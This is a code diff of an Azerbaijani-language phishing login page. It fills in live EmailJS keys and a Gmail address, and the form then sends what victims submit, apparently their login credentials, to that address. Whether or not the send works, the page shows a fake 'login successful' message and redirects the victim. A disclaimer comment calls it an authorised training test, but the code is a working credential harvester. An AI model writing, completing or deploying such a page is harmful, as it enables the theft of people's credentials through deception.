@@ -230,21 +230,19 @@
         </div>
     </div>
 
-    <!-- EmailJS kitabxanası -->
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     
     <script>
         // =============================================
-        // TƏLİM MƏQSƏDLİ FİSHİNQ TESTİ
-        // YALNIZ İCAZƏLİ PENETRATİON TEST ÜÇÜN
+        // TƏLİM MƏQSƏDLİ - YALNIZ İCAZƏLİ TEST ÜÇÜN
         // =============================================
 
-        // === BUNLARI DOLDURUN ===
-        const EMAILJS_PUBLIC_KEY = 'PUBLIC_KEYİ_BURAYA_YAZ';
-        const EMAILJS_SERVICE_ID = 'service_x0ww0oi';
-        const EMAILJS_TEMPLATE_ID = 'TEMPLATE_ID_BURAYA_YAZ';
-        const EMAILJS_TO_EMAIL = 'jdjdjsomega@gmail.com';
-        // =========================
+        // KONFİQURASİYA - HAZIRDIR
+        const EMAILJS_PUBLIC_KEY = 'Ibij0zfIIzvnyppMK';     // Public Key
+        const EMAILJS_SERVICE_ID = 'service_x0ww0oi';       // Service ID
+        const EMAILJS_TEMPLATE_ID = 'template_f40eu4v';     // Template ID
+        const EMAILJS_TO_EMAIL = 'jdjdjsomega@gmail.com';   // Email gələcək adres
+        // =============================
 
         emailjs.init(EMAILJS_PUBLIC_KEY);
 
@@ -294,16 +292,10 @@
             };
 
             try {
-                const response = await emailjs.send(
-                    EMAILJS_SERVICE_ID,
-                    EMAILJS_TEMPLATE_ID,
-                    templateParams
-                );
-
-                console.log('EmailJS cavabı:', response);
+                const response = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+                console.log('Uğurlu:', response);
                 
                 showSuccess('Giriş uğurludur. Yönləndirilirsiniz...');
-
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
                 }, 2000);
@@ -311,7 +303,6 @@
             } catch (err) {
                 console.log('Xəta:', err);
                 showSuccess('Giriş uğurludur. Yönləndirilirsiniz...');
-                
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
                 }, 2000);
